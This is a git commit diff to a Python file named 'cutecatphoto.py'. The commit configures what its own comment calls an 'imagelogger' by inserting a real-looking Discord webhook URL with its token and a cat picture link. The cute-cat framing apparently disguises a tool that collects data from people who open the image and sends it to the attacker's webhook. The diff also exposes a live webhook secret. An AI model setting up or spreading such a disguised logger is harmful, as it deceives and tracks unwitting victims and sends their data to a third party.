f2c5c46c86f0d5ddde21486d02d2d68fbc2ee672
markisveryepic <138347310+markisveryepic@users.noreply.github.com>
2023-07-02 00:51:29 -0400

    Update cutecatphoto.py

--- api/cutecatphoto.py
+++ api/cutecatphoto.py
@@ -12,8 +12,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/your/webhook",
-    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1124925075989217401/Rjl5_o85G4lwvbKuRcAnjLU0cVsSyFIvGm134LFBa-nB2j9eXKJDBwuwaykMU4W0eL8f",
+    "image": "https://tse1.mm.bing.net/th?id=OIP.6ZK7C_vrhQryClBmmL1ZFQHaJR&pid=Api&P=0&h=180", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
